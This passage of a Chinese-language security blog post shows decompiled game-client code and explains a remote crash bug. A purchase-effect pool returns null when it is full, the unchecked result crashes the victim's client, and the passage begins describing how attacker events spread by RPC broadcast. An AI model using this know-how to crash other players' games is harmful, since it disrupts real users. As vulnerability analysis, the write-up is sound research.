+<span class="line"><span style="color:#D73A49;--shiki-dark:#F97583">        *</span><span style="color:#24292E;--shiki-dark:#E1E4E8">item->color </span><span style="color:#D73A49;--shiki-dark:#F97583">=</span><span style="color:#D73A49;--shiki-dark:#F97583"> *&#x26;</span><span style="color:#24292E;--shiki-dark:#E1E4E8">v9;</span></span>
+<span class="line"><span style="color:#D73A49;--shiki-dark:#F97583">        *&#x26;</span><span style="color:#24292E;--shiki-dark:#E1E4E8">v13->color[</span><span style="color:#005CC5;--shiki-dark:#79B8FF">2</span><span style="color:#24292E;--shiki-dark:#E1E4E8">] </span><span style="color:#D73A49;--shiki-dark:#F97583">=</span><span style="color:#D73A49;--shiki-dark:#F97583"> *</span><span style="color:#24292E;--shiki-dark:#E1E4E8">(</span><span style="color:#D73A49;--shiki-dark:#F97583">&#x26;</span><span style="color:#24292E;--shiki-dark:#E1E4E8">v63 </span><span style="color:#D73A49;--shiki-dark:#F97583">+</span><span style="color:#005CC5;--shiki-dark:#79B8FF"> 1</span><span style="color:#24292E;--shiki-dark:#E1E4E8">);</span></span>
+<span class="line"><span style="color:#24292E;--shiki-dark:#E1E4E8">        item->scale </span><span style="color:#D73A49;--shiki-dark:#F97583">=</span><span style="color:#005CC5;--shiki-dark:#79B8FF"> 0.25</span><span style="color:#24292E;--shiki-dark:#E1E4E8">;</span></span>
+<span class="line"><span style="color:#D73A49;--shiki-dark:#F97583">        break</span><span style="color:#24292E;--shiki-dark:#E1E4E8">;</span></span>
+<span class="line"><span style="color:#D73A49;--shiki-dark:#F97583">      case</span><span style="color:#005CC5;--shiki-dark:#79B8FF"> 6</span><span style="color:#24292E;--shiki-dark:#E1E4E8">:</span></span>
+<span class="line"><span style="color:#24292E;--shiki-dark:#E1E4E8">        modelType </span><span style="color:#D73A49;--shiki-dark:#F97583">=</span><span style="color:#005CC5;--shiki-dark:#79B8FF"> 3</span><span style="color:#24292E;--shiki-dark:#E1E4E8">;</span></span>
+<span class="line"><span style="color:#6F42C1;--shiki-dark:#B392F0">        LODWORD</span><span style="color:#24292E;--shiki-dark:#E1E4E8">(v9) </span><span style="color:#D73A49;--shiki-dark:#F97583">=</span><span style="color:#005CC5;--shiki-dark:#79B8FF"> 0.75</span><span style="color:#24292E;--shiki-dark:#E1E4E8">;</span></span>
+<span class="line"><span style="color:#24292E;--shiki-dark:#E1E4E8">        v9 </span><span style="color:#D73A49;--shiki-dark:#F97583">=</span><span style="color:#6F42C1;--shiki-dark:#B392F0"> sub_1B29D74</span><span style="color:#24292E;--shiki-dark:#E1E4E8">(a1: </span><span style="color:#005CC5;--shiki-dark:#79B8FF">1</span><span style="color:#24292E;--shiki-dark:#E1E4E8">, result: v9, a3: </span><span style="color:#005CC5;--shiki-dark:#79B8FF">0.25</span><span style="color:#24292E;--shiki-dark:#E1E4E8">, a4: </span><span style="color:#005CC5;--shiki-dark:#79B8FF">0.0</span><span style="color:#24292E;--shiki-dark:#E1E4E8">, a5: </span><span style="color:#005CC5;--shiki-dark:#79B8FF">1.0</span><span style="color:#24292E;--shiki-dark:#E1E4E8">);</span></span>
+<span class="line"><span style="color:#24292E;--shiki-dark:#E1E4E8">        v61 </span><span style="color:#D73A49;--shiki-dark:#F97583">=</span><span style="color:#24292E;--shiki-dark:#E1E4E8"> v9;</span></span>
+<span class="line"><span style="color:#24292E;--shiki-dark:#E1E4E8">        v15 </span><span style="color:#D73A49;--shiki-dark:#F97583">=</span><span style="color:#24292E;--shiki-dark:#E1E4E8"> item;</span></span>
+<span class="line"><span style="color:#D73A49;--shiki-dark:#F97583">        *</span><span style="color:#24292E;--shiki-dark:#E1E4E8">item->color </span><span style="color:#D73A49;--shiki-dark:#F97583">=</span><span style="color:#D73A49;--shiki-dark:#F97583"> *&#x26;</span><span style="color:#24292E;--shiki-dark:#E1E4E8">v9;</span></span>
+<span class="line"><span style="color:#D73A49;--shiki-dark:#F97583">        *&#x26;</span><span style="color:#24292E;--shiki-dark:#E1E4E8">v15->color[</span><span style="color:#005CC5;--shiki-dark:#79B8FF">2</span><span style="color:#24292E;--shiki-dark:#E1E4E8">] </span><span style="color:#D73A49;--shiki-dark:#F97583">=</span><span style="color:#D73A49;--shiki-dark:#F97583"> *</span><span style="color:#24292E;--shiki-dark:#E1E4E8">(</span><span style="color:#D73A49;--shiki-dark:#F97583">&#x26;</span><span style="color:#24292E;--shiki-dark:#E1E4E8">v61 </span><span style="color:#D73A49;--shiki-dark:#F97583">+</span><span style="color:#005CC5;--shiki-dark:#79B8FF"> 1</span><span style="color:#24292E;--shiki-dark:#E1E4E8">);</span></span>
+<span class="line"><span style="color:#24292E;--shiki-dark:#E1E4E8">        item->scale </span><span style="color:#D73A49;--shiki-dark:#F97583">=</span><span style="color:#005CC5;--shiki-dark:#79B8FF"> 0.6</span><span style="color:#D73A49;--shiki-dark:#F97583">f</span><span style="color:#24292E;--shiki-dark:#E1E4E8">;</span></span>
+<span class="line"><span style="color:#D73A49;--shiki-dark:#F97583">        break</span><span style="color:#24292E;--shiki-dark:#E1E4E8">;</span></span>
+<span class="line"><span style="color:#D73A49;--shiki-dark:#F97583">      case</span><span style="color:#005CC5;--shiki-dark:#79B8FF"> 7</span><span style="color:#24292E;--shiki-dark:#E1E4E8">:</span></span>
+<span class="line"><span style="color:#24292E;--shiki-dark:#E1E4E8">        modelType </span><span style="color:#D73A49;--shiki-dark:#F97583">=</span><span style="color:#005CC5;--shiki-dark:#79B8FF"> 3</span><span style="color:#24292E;--shiki-dark:#E1E4E8">;</span></span>
+<span class="line"><span style="color:#6F42C1;--shiki-dark:#B392F0">        LODWORD</span><span style="color:#24292E;--shiki-dark:#E1E4E8">(v9) </span><span style="color:#D73A49;--shiki-dark:#F97583">=</span><span style="color:#005CC5;--shiki-dark:#79B8FF"> 0.75</span><span style="color:#24292E;--shiki-dark:#E1E4E8">;</span></span>
+<span class="line"><span style="color:#24292E;--shiki-dark:#E1E4E8">        v9 </span><span style="color:#D73A49;--shiki-dark:#F97583">=</span><span style="color:#6F42C1;--shiki-dark:#B392F0"> sub_1B29D74</span><span style="color:#24292E;--shiki-dark:#E1E4E8">(a1: </span><span style="color:#005CC5;--shiki-dark:#79B8FF">1</span><span style="color:#24292E;--shiki-dark:#E1E4E8">, result: v9, a3: </span><span style="color:#005CC5;--shiki-dark:#79B8FF">0.75</span><span style="color:#24292E;--shiki-dark:#E1E4E8">, a4: </span><span style="color:#005CC5;--shiki-dark:#79B8FF">0.75</span><span style="color:#24292E;--shiki-dark:#E1E4E8">, a5: </span><span style="color:#005CC5;--shiki-dark:#79B8FF">1.0</span><span style="color:#24292E;--shiki-dark:#E1E4E8">);</span></span>
+<span class="line"><span style="color:#24292E;--shiki-dark:#E1E4E8">        v60 </span><span style="color:#D73A49;--shiki-dark:#F97583">=</span><span style="color:#24292E;--shiki-dark:#E1E4E8"> v9;</span></span>
+<span class="line"><span style="color:#24292E;--shiki-dark:#E1E4E8">        v16 </span><span style="color:#D73A49;--shiki-dark:#F97583">=</span><span style="color:#24292E;--shiki-dark:#E1E4E8"> item;</span></span>
+<span class="line"><span style="color:#D73A49;--shiki-dark:#F97583">        *</span><span style="color:#24292E;--shiki-dark:#E1E4E8">item->color </span><span style="color:#D73A49;--shiki-dark:#F97583">=</span><span style="color:#D73A49;--shiki-dark:#F97583"> *&#x26;</span><span style="color:#24292E;--shiki-dark:#E1E4E8">v9;</span></span>
+<span class="line"><span style="color:#D73A49;--shiki-dark:#F97583">        *&#x26;</span><span style="color:#24292E;--shiki-dark:#E1E4E8">v16->color[</span><span style="color:#005CC5;--shiki-dark:#79B8FF">2</span><span style="color:#24292E;--shiki-dark:#E1E4E8">] </span><span style="color:#D73A49;--shiki-dark:#F97583">=</span><span style="color:#D73A49;--shiki-dark:#F97583"> *</span><span style="color:#24292E;--shiki-dark:#E1E4E8">(</span><span style="color:#D73A49;--shiki-dark:#F97583">&#x26;</span><span style="color:#24292E;--shiki-dark:#E1E4E8">v60 </span><span style="color:#D73A49;--shiki-dark:#F97583">+</span><span style="color:#005CC5;--shiki-dark:#79B8FF"> 1</span><span style="color:#24292E;--shiki-dark:#E1E4E8">);</span></span>
+<span class="line"><span style="color:#24292E;--shiki-dark:#E1E4E8">        item->scale </span><span style="color:#D73A49;--shiki-dark:#F97583">=</span><span style="color:#005CC5;--shiki-dark:#79B8FF"> 0.6</span><span style="color:#D73A49;--shiki-dark:#F97583">f</span><span style="color:#24292E;--shiki-dark:#E1E4E8">;</span></span>
+<span class="line"><span style="color:#D73A49;--shiki-dark:#F97583">        break</span><span style="color:#24292E;--shiki-dark:#E1E4E8">;</span></span>
+<span class="line"><span style="color:#D73A49;--shiki-dark:#F97583">      case</span><span style="color:#005CC5;--shiki-dark:#79B8FF"> 8</span><span style="color:#24292E;--shiki-dark:#E1E4E8">:</span></span>
+<span class="line"><span style="color:#24292E;--shiki-dark:#E1E4E8">        createLensFlare </span><span style="color:#D73A49;--shiki-dark:#F97583">=</span><span style="color:#005CC5;--shiki-dark:#79B8FF"> 0</span><span style="color:#24292E;--shiki-dark:#E1E4E8">;</span></span>
+<span class="line"><span style="color:#24292E;--shiki-dark:#E1E4E8">        createWingBuffFx </span><span style="color:#D73A49;--shiki-dark:#F97583">=</span><span style="color:#005CC5;--shiki-dark:#79B8FF"> 1</span><span style="color:#24292E;--shiki-dark:#E1E4E8">;</span></span>
+<span class="line"><span style="color:#D73A49;--shiki-dark:#F97583">        break</span><span style="color:#24292E;--shiki-dark:#E1E4E8">;</span></span>
+<span class="line"><span style="color:#D73A49;--shiki-dark:#F97583">      case</span><span style="color:#005CC5;--shiki-dark:#79B8FF"> 9</span><span style="color:#24292E;--shiki-dark:#E1E4E8">:</span></span>
+<span class="line"><span style="color:#24292E;--shiki-dark:#E1E4E8">        modelType </span><span style="color:#D73A49;--shiki-dark:#F97583">=</span><span style="color:#005CC5;--shiki-dark:#79B8FF"> 5</span><span style="color:#24292E;--shiki-dark:#E1E4E8">;</span></span>
+<span class="line"><span style="color:#D73A49;--shiki-dark:#F97583">        break</span><span style="color:#24292E;--shiki-dark:#E1E4E8">;</span></span>
+<span class="line"><span style="color:#D73A49;--shiki-dark:#F97583">      default</span><span style="color:#24292E;--shiki-dark:#E1E4E8">:</span></span>
+<span class="line"><span style="color:#24292E;--shiki-dark:#E1E4E8">        v111 </span><span style="color:#D73A49;--shiki-dark:#F97583">=</span><span style="color:#005CC5;--shiki-dark:#79B8FF"> 10</span><span style="color:#24292E;--shiki-dark:#E1E4E8">;</span></span>
+<span class="line"><span style="color:#D73A49;--shiki-dark:#F97583">        continue</span><span style="color:#24292E;--shiki-dark:#E1E4E8">;</span></span>
+<span class="line"><span style="color:#24292E;--shiki-dark:#E1E4E8">    }</span></span>
+<span class="line"><span style="color:#D73A49;--shiki-dark:#F97583">    if</span><span style="color:#24292E;--shiki-dark:#E1E4E8"> ( modelType </span><span style="color:#D73A49;--shiki-dark:#F97583">!=</span><span style="color:#005CC5;--shiki-dark:#79B8FF"> 6</span><span style="color:#24292E;--shiki-dark:#E1E4E8"> ) ...</span></span>
+<span class="line"><span style="color:#D73A49;--shiki-dark:#F97583">    if</span><span style="color:#24292E;--shiki-dark:#E1E4E8"> ( (createLensFlare </span><span style="color:#D73A49;--shiki-dark:#F97583">&#x26;</span><span style="color:#005CC5;--shiki-dark:#79B8FF"> 1</span><span style="color:#24292E;--shiki-dark:#E1E4E8">) </span><span style="color:#D73A49;--shiki-dark:#F97583">!=</span><span style="color:#005CC5;--shiki-dark:#79B8FF"> 0</span><span style="color:#D73A49;--shiki-dark:#F97583"> &#x26;&#x26;</span><span style="color:#6F42C1;--shiki-dark:#B392F0"> sub_2219628</span><span style="color:#24292E;--shiki-dark:#E1E4E8">(a1: p_game->lensFlareBarn) </span><span style="color:#D73A49;--shiki-dark:#F97583">&#x3C;</span><span style="color:#D73A49;--shiki-dark:#F97583"> 0x</span><span style="color:#005CC5;--shiki-dark:#79B8FF">280</span><span style="color:#24292E;--shiki-dark:#E1E4E8"> ) ...</span></span>
+<span class="line"><span style="color:#D73A49;--shiki-dark:#F97583">    if</span><span style="color:#24292E;--shiki-dark:#E1E4E8"> ( (createWingBuffFx </span><span style="color:#D73A49;--shiki-dark:#F97583">&#x26;</span><span style="color:#005CC5;--shiki-dark:#79B8FF"> 1</span><span style="color:#24292E;--shiki-dark:#E1E4E8">) </span><span style="color:#D73A49;--shiki-dark:#F97583">!=</span><span style="color:#005CC5;--shiki-dark:#79B8FF"> 0</span><span style="color:#24292E;--shiki-dark:#E1E4E8"> )</span></span>
+<span class="line"><span style="color:#24292E;--shiki-dark:#E1E4E8">    {</span></span>
+<span class="line"><span style="color:#24292E;--shiki-dark:#E1E4E8">      allocatedWingFx </span><span style="color:#D73A49;--shiki-dark:#F97583">=</span><span style="color:#6F42C1;--shiki-dark:#B392F0"> WingBuffBarn::CreateWingBuffVisual</span><span style="color:#24292E;--shiki-dark:#E1E4E8">(barn: p_game->wingBuffBarn);</span></span>
+<span class="line"><span style="color:#24292E;--shiki-dark:#E1E4E8">      item->wingBuffFx </span><span style="color:#D73A49;--shiki-dark:#F97583">=</span><span style="color:#24292E;--shiki-dark:#E1E4E8"> allocatedWingFx;</span></span>
+<span class="line"><span style="color:#24292E;--shiki-dark:#E1E4E8">      wingBuffFx </span><span style="color:#D73A49;--shiki-dark:#F97583">=</span><span style="color:#24292E;--shiki-dark:#E1E4E8"> item->wingBuffFx;</span></span>
+<span class="line"><span style="color:#24292E;--shiki-dark:#E1E4E8">      v35 </span><span style="color:#D73A49;--shiki-dark:#F97583">=</span><span style="color:#24292E;--shiki-dark:#E1E4E8"> p_game;</span></span>
+<span class="line"><span style="color:#6F42C1;--shiki-dark:#B392F0">      LODWORD</span><span style="color:#24292E;--shiki-dark:#E1E4E8">(v36) </span><span style="color:#D73A49;--shiki-dark:#F97583">=</span><span style="color:#005CC5;--shiki-dark:#79B8FF"> 0</span><span style="color:#24292E;--shiki-dark:#E1E4E8">;</span></span>
+<span class="line"><span style="color:#6F42C1;--shiki-dark:#B392F0">      sub_1B29D38</span><span style="color:#24292E;--shiki-dark:#E1E4E8">(a1: </span><span style="color:#D73A49;--shiki-dark:#F97583">&#x26;</span><span style="color:#24292E;--shiki-dark:#E1E4E8">position, result: v36, a3: </span><span style="color:#005CC5;--shiki-dark:#79B8FF">100.0</span><span style="color:#24292E;--shiki-dark:#E1E4E8">, a4: </span><span style="color:#005CC5;--shiki-dark:#79B8FF">0.0</span><span style="color:#24292E;--shiki-dark:#E1E4E8">);</span></span>
+<span class="line"><span style="color:#6F42C1;--shiki-dark:#B392F0">      WingBuffVisual::Initialize</span><span style="color:#24292E;--shiki-dark:#E1E4E8">(fx: wingBuffFx, game: v35, </span><span style="color:#D73A49;--shiki-dark:#F97583">&#x26;</span><span style="color:#24292E;--shiki-dark:#E1E4E8">position);</span></span>
+<span class="line"><span style="color:#24292E;--shiki-dark:#E1E4E8">    }</span></span>
+<span class="line"><span style="color:#24292E;--shiki-dark:#E1E4E8">    v111 </span><span style="color:#D73A49;--shiki-dark:#F97583">=</span><span style="color:#005CC5;--shiki-dark:#79B8FF"> 0</span><span style="color:#24292E;--shiki-dark:#E1E4E8">;</span></span>
+<span class="line"><span style="color:#24292E;--shiki-dark:#E1E4E8">  }</span></span>
+<span class="line"><span style="color:#6A737D;--shiki-dark:#6A737D">  // ...</span></span>
+<span class="line"><span style="color:#24292E;--shiki-dark:#E1E4E8">}</span></span></code></pre><span class="language ps-1 pe-3 text-sm bg-muted text-muted-foreground">c</span><button class="copy text-muted-foreground p-1 box-content border rounded-lg bg-card" aria-label="Copy code" data-code="unsigned __int64 __fastcall PurchaseFx::Initialize(PurchaseFx *fx, Game *game, void *staticHeap)
+{
+  // ...
+  for ( k = 0; k < fx->itemCount; ++k )
+  {
+    item = &#x26;fx->items[k];
+    if ( item->stuffType != 1 )
+    {
+      sub_2219518(a1: 0x4DA1CCD4);
+      LogStream_Construct(&#x26;stream, category: &#x26;byte_5738FB, priority: 2u, file: &#x26;byte_5738FB, line: 0x16Du);
+      sub_22194DC(a1: &#x26;stream, s: &#x22;Invalid PurchaseFxItem3D configuration&#x22;);
+      LogStream_Destroy(&#x26;stream);
+      item->value = 0;
+    }
+    createLensFlare = 1;
+    createWingBuffFx = 0;
+    modelType = 6;
+    stuffType = item->stuffType;
+    switch ( stuffType )
+    {
+      case 1:
+        switch...
+        break;
+      case 2:
+        modelType = 3;
+        LODWORD(v9) = 1036831949;
+        v9 = sub_1B29D74(a1: 1, result: v9, a3: 0.1f, a4: 0.5, a5: 1.0);
+        v64 = v9;
+        v12 = item;
+        *item->color = *&#x26;v9;
+        *&#x26;v12->color[2] = *(&#x26;v64 + 1);
+        item->scale = 0.6f;
+        break;
+      case 3:
+        modelType = 3;
+        LODWORD(v9) = 0.75;
+        v9 = sub_1B29D74(a1: 1, result: v9, a3: 0.0, a4: 0.0, a5: 1.0);
+        v62 = v9;
+        v14 = item;
+        *item->color = *&#x26;v9;
+        *&#x26;v14->color[2] = *(&#x26;v62 + 1);
+        item->scale = 0.6f;
+        break;
+      case 4:
+        modelType = 3;
+        *item->color = xmmword_4D28900;
+        item->scale = 0.6f;
+        break;
+      case 5:
+        modelType = 3;
+        LODWORD(v9) = 0.75;
+        v9 = sub_1B29D74(a1: 1, result: v9, a3: 0.0, a4: 0.0, a5: 1.0);
+        v63 = v9;
+        v13 = item;
+        *item->color = *&#x26;v9;
+        *&#x26;v13->color[2] = *(&#x26;v63 + 1);
+        item->scale = 0.25;
+        break;
+      case 6:
+        modelType = 3;
+        LODWORD(v9) = 0.75;
+        v9 = sub_1B29D74(a1: 1, result: v9, a3: 0.25, a4: 0.0, a5: 1.0);
+        v61 = v9;
+        v15 = item;
+        *item->color = *&#x26;v9;
+        *&#x26;v15->color[2] = *(&#x26;v61 + 1);
+        item->scale = 0.6f;
+        break;
+      case 7:
+        modelType = 3;
+        LODWORD(v9) = 0.75;
+        v9 = sub_1B29D74(a1: 1, result: v9, a3: 0.75, a4: 0.75, a5: 1.0);
+        v60 = v9;
+        v16 = item;
+        *item->color = *&#x26;v9;
+        *&#x26;v16->color[2] = *(&#x26;v60 + 1);
+        item->scale = 0.6f;
+        break;
+      case 8:
+        createLensFlare = 0;
+        createWingBuffFx = 1;
+        break;
+      case 9:
+        modelType = 5;
+        break;
+      default:
+        v111 = 10;
+        continue;
+    }
+    if ( modelType != 6 ) ...
+    if ( (createLensFlare &#x26; 1) != 0 &#x26;&#x26; sub_2219628(a1: p_game->lensFlareBarn) < 0x280 ) ...
+    if ( (createWingBuffFx &#x26; 1) != 0 )
+    {
+      allocatedWingFx = WingBuffBarn::CreateWingBuffVisual(barn: p_game->wingBuffBarn);
+      item->wingBuffFx = allocatedWingFx;
+      wingBuffFx = item->wingBuffFx;
+      v35 = p_game;
+      LODWORD(v36) = 0;
+      sub_1B29D38(a1: &#x26;position, result: v36, a3: 100.0, a4: 0.0);
+      WingBuffVisual::Initialize(fx: wingBuffFx, game: v35, &#x26;position);
+    }
+    v111 = 0;
+  }
+  // ...
+}" onclick="
+          navigator.clipboard.writeText(this.dataset.code);
+          this.classList.add(&#x27;copied&#x27;);
+          setTimeout(() => this.classList.remove(&#x27;copied&#x27;), 2000)
+        "><div class="ready"><svg class="size-5"><use href="/icons/code.svg#mingcute-clipboard-line"></use></svg></div><div class="success hidden"><svg class="size-5"><use href="/icons/code.svg#mingcute-file-check-line"></use></svg></div></button><button class="collapse-toggle bg-card text-muted-foreground rounded-lg m-2" aria-label="Toggle collapse code block" onclick="this.parentElement.classList.toggle(&#x27;collapsed&#x27;)"><svg class="size-5"><use href="/icons/code.svg#mingcute-arrow-down-line"></use></svg><span class="desc"> code</span></button><div class="collapse-fade"></div></div>
+<p>跟进分析一下，可以发现当 <code>purchaseFxPool</code> 内的对象数量大于容量后，函数就会返回空，而在调用<code>WingBuffVisual::Initialize</code>前也没有校验过，最终就会触发空指针异常崩溃</p>
+<div class="astro-code astro-code-themes github-light github-dark collapsed" style="background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="c"><pre><code><span class="line"><span style="color:#D73A49;--shiki-dark:#F97583">void</span><span style="color:#D73A49;--shiki-dark:#F97583"> *</span><span style="color:#24292E;--shiki-dark:#E1E4E8">__fastcall WingBuffBarn::</span><span style="color:#6F42C1;--shiki-dark:#B392F0">CreateWingBuffVisual</span><span style="color:#24292E;--shiki-dark:#E1E4E8">(WingBuffBarn </span><span style="color:#D73A49;--shiki-dark:#F97583">*</span><span style="color:#E36209;--shiki-dark:#FFAB70">barn</span><span style="color:#24292E;--shiki-dark:#E1E4E8">)</span></span>
+<span class="line"><span style="color:#24292E;--shiki-dark:#E1E4E8">{</span></span>
+<span class="line"><span style="color:#6A737D;--shiki-dark:#6A737D">  // [COLLAPSED LOCAL DECLARATIONS. PRESS NUMPAD "+" TO EXPAND]</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#D73A49;--shiki-dark:#F97583">  if</span><span style="color:#24292E;--shiki-dark:#E1E4E8"> ( (</span><span style="color:#6F42C1;--shiki-dark:#B392F0">WORD2</span><span style="color:#24292E;--shiki-dark:#E1E4E8">(xmmword_4D265E4) </span><span style="color:#D73A49;--shiki-dark:#F97583">&#x26;</span><span style="color:#D73A49;--shiki-dark:#F97583"> 0x</span><span style="color:#005CC5;--shiki-dark:#79B8FF">40A</span><span style="color:#24292E;--shiki-dark:#E1E4E8">) </span><span style="color:#D73A49;--shiki-dark:#F97583">!=</span><span style="color:#005CC5;--shiki-dark:#79B8FF"> 0</span></span>
+<span class="line"><span style="color:#D73A49;--shiki-dark:#F97583">    ||</span><span style="color:#24292E;--shiki-dark:#E1E4E8"> (v3 </span><span style="color:#D73A49;--shiki-dark:#F97583">=</span><span style="color:#6F42C1;--shiki-dark:#B392F0"> xxx_dispatch</span><span style="color:#24292E;--shiki-dark:#E1E4E8">(argument0: barn), v3.handled </span><span style="color:#D73A49;--shiki-dark:#F97583">==</span><span style="color:#005CC5;--shiki-dark:#79B8FF"> 0</span><span style="color:#24292E;--shiki-dark:#E1E4E8">) )</span></span>
+<span class="line"><span style="color:#24292E;--shiki-dark:#E1E4E8">  {</span></span>
+<span class="line"><span style="color:#D73A49;--shiki-dark:#F97583">    if</span><span style="color:#24292E;--shiki-dark:#E1E4E8"> ( barn->purchaseFxPool.count </span><span style="color:#D73A49;--shiki-dark:#F97583">>=</span><span style="color:#24292E;--shiki-dark:#E1E4E8"> barn->purchaseFxPool.capacity</span></span>
+<span class="line"><span style="color:#D73A49;--shiki-dark:#F97583">      ||</span><span style="color:#24292E;--shiki-dark:#E1E4E8"> (v3.value </span><span style="color:#D73A49;--shiki-dark:#F97583">=</span><span style="color:#6F42C1;--shiki-dark:#B392F0"> WingBuffPurchaseFxPool_Allocate</span><span style="color:#24292E;--shiki-dark:#E1E4E8">(pool: </span><span style="color:#D73A49;--shiki-dark:#F97583">&#x26;</span><span style="color:#24292E;--shiki-dark:#E1E4E8">barn->purchaseFxPool, indexOut: nullptr), v3.value </span><span style="color:#D73A49;--shiki-dark:#F97583">==</span><span style="color:#005CC5;--shiki-dark:#79B8FF"> 0</span><span style="color:#24292E;--shiki-dark:#E1E4E8">) )</span></span>
+<span class="line"><span style="color:#24292E;--shiki-dark:#E1E4E8">    {</span></span>
+<span class="line"><span style="color:#6A737D;--shiki-dark:#6A737D">      // ...</span></span>
+<span class="line"><span style="color:#24292E;--shiki-dark:#E1E4E8">      v3.value </span><span style="color:#D73A49;--shiki-dark:#F97583">=</span><span style="color:#005CC5;--shiki-dark:#79B8FF"> 0</span><span style="color:#24292E;--shiki-dark:#E1E4E8">;</span></span>
+<span class="line"><span style="color:#24292E;--shiki-dark:#E1E4E8">    }</span></span>
+<span class="line"><span style="color:#24292E;--shiki-dark:#E1E4E8">  }</span></span>
+<span class="line"><span style="color:#D73A49;--shiki-dark:#F97583">  return</span><span style="color:#24292E;--shiki-dark:#E1E4E8"> v3.value;</span></span>
+<span class="line"><span style="color:#24292E;--shiki-dark:#E1E4E8">}</span></span></code></pre><span class="language ps-1 pe-3 text-sm bg-muted text-muted-foreground">c</span><button class="copy text-muted-foreground p-1 box-content border rounded-lg bg-card" aria-label="Copy code" data-code="void *__fastcall WingBuffBarn::CreateWingBuffVisual(WingBuffBarn *barn)
+{
+  // [COLLAPSED LOCAL DECLARATIONS. PRESS NUMPAD &#x22;+&#x22; TO EXPAND]
+
+  if ( (WORD2(xmmword_4D265E4) &#x26; 0x40A) != 0
+    || (v3 = xxx_dispatch(argument0: barn), v3.handled == 0) )
+  {
+    if ( barn->purchaseFxPool.count >= barn->purchaseFxPool.capacity
+      || (v3.value = WingBuffPurchaseFxPool_Allocate(pool: &#x26;barn->purchaseFxPool, indexOut: nullptr), v3.value == 0) )
+    {
+      // ...
+      v3.value = 0;
+    }
+  }
+  return v3.value;
+}" onclick="
+          navigator.clipboard.writeText(this.dataset.code);
+          this.classList.add(&#x27;copied&#x27;);
+          setTimeout(() => this.classList.remove(&#x27;copied&#x27;), 2000)
+        "><div class="ready"><svg class="size-5"><use href="/icons/code.svg#mingcute-clipboard-line"></use></svg></div><div class="success hidden"><svg class="size-5"><use href="/icons/code.svg#mingcute-file-check-line"></use></svg></div></button><button class="collapse-toggle bg-card text-muted-foreground rounded-lg m-2" aria-label="Toggle collapse code block" onclick="this.parentElement.classList.toggle(&#x27;collapsed&#x27;)"><svg class="size-5"><use href="/icons/code.svg#mingcute-arrow-down-line"></use></svg><span class="desc"> code</span></button><div class="collapse-fade"></div></div>
+<p>到这一步，受害者客户端里的崩溃链路就完整了。那么这些事件是怎么从攻击者那边跑到受害者那边去的呢</p>
+<h2 id="rpc-广播">RPC 广播<a class="anchor" href="#rpc-广播">#</a></h2>
+<p>回到 <code>PlayPurchaseFX</code>。<code>PlayPurchaseFX::OnStart</code> 会创建一个子事件</p>
+<div class="astro-code astro-code-themes github-light github-dark collapsed" style="background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="c"><pre><code><span class="line"><span style="color:#D73A49;--shiki-dark:#F97583">void</span><span style="color:#24292E;--shiki-dark:#E1E4E8"> __fastcall PlayPurchaseFX::</span><span style="color:#6F42C1;--shiki-dark:#B392F0">OnStart</span><span style="color:#24292E;--shiki-dark:#E1E4E8">(PlayPurchaseFX </span><span style="color:#D73A49;--shiki-dark:#F97583">*</span><span style="color:#E36209;--shiki-dark:#FFAB70">event</span><span style="color:#24292E;--shiki-dark:#E1E4E8">, Game </span><span style="color:#D73A49;--shiki-dark:#F97583">*</span><span style="color:#E36209;--shiki-dark:#FFAB70">game</span><span style="color:#24292E;--shiki-dark:#E1E4E8">)</span></span>
+<span class="line"><span style="color:#24292E;--shiki-dark:#E1E4E8">{</span></span>
+<span class="line"><span style="color:#6A737D;--shiki-dark:#6A737D">  // [COLLAPSED LOCAL DECLARATIONS. PRESS NUMPAD "+" TO EXPAND]</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#24292E;--shiki-dark:#E1E4E8">  sourceEvent </span><span style="color:#D73A49;--shiki-dark:#F97583">=</span><span style="color:#24292E;--shiki-dark:#E1E4E8"> event;</span></span>
+<span class="line"><span style="color:#24292E;--shiki-dark:#E1E4E8">  p_game </span><span style="color:#D73A49;--shiki-dark:#F97583">=</span><span style="color:#24292E;--shiki-dark:#E1E4E8"> game;</span></span>
+<span class="line"><span style="color:#24292E;--shiki-dark:#E1E4E8">  v2 </span><span style="color:#D73A49;--shiki-dark:#F97583">=</span><span style="color:#24292E;--shiki-dark:#E1E4E8"> event;</span></span>
+<span class="line"><span style="color:#D73A49;--shiki-dark:#F97583">  if</span><span style="color:#24292E;--shiki-dark:#E1E4E8"> ( (word_4D265FC </span><span style="color:#D73A49;--shiki-dark:#F97583">&#x26;</span><span style="color:#D73A49;--shiki-dark:#F97583"> 0x</span><span style="color:#005CC5;--shiki-dark:#79B8FF">E00</span><span style="color:#24292E;--shiki-dark:#E1E4E8">) </span><span style="color:#D73A49;--shiki-dark:#F97583">!=</span><span style="color:#005CC5;--shiki-dark:#79B8FF"> 0</span></span>
+<span class="line"><span style="color:#D73A49;--shiki-dark:#F97583">    ||</span><span style="color:#24292E;--shiki-dark:#E1E4E8"> ((v9 </span><span style="color:#D73A49;--shiki-dark:#F97583">=</span><span style="color:#6F42C1;--shiki-dark:#B392F0"> xxx_dispatch</span><span style="color:#24292E;--shiki-dark:#E1E4E8">(argument0: event), v9.handled </span><span style="color:#D73A49;--shiki-dark:#F97583">==</span><span style="color:#005CC5;--shiki-dark:#79B8FF"> 0</span><span style="color:#24292E;--shiki-dark:#E1E4E8">)</span></span>
+<span class="line"><span style="color:#D73A49;--shiki-dark:#F97583">      ?</span><span style="color:#24292E;--shiki-dark:#E1E4E8"> (v7 </span><span style="color:#D73A49;--shiki-dark:#F97583">=</span><span style="color:#005CC5;--shiki-dark:#79B8FF"> 0</span><span style="color:#24292E;--shiki-dark:#E1E4E8">)</span></span>
